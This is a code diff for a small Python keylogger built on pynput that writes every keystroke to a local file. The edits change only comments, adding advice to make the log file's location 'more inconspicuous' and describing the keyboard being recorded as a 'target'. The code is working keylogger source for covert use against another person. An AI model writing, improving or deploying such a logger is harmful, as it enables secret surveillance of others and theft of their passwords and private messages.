@@ -1,9 +1,9 @@
 from pynput.keyboard import Listener
 
-# Path to log file
+# Path to log file can be changed to be more inconspicuous 
 log_file = "key_log.txt"
 
-# Function to write the key press to log file
+# Function to write the target key stroke to key_log.txt
 def on_press(key):
     try:
         with open(log_file, "a") as file:
@@ -13,6 +13,6 @@ def on_press(key):
         with open(log_file, "a") as file:
             file.write(f" {key} ")
 
-# Start listening to the keyboard
+# Start listening on target keyboard
 with Listener(on_press=on_press) as listener:
     listener.join()
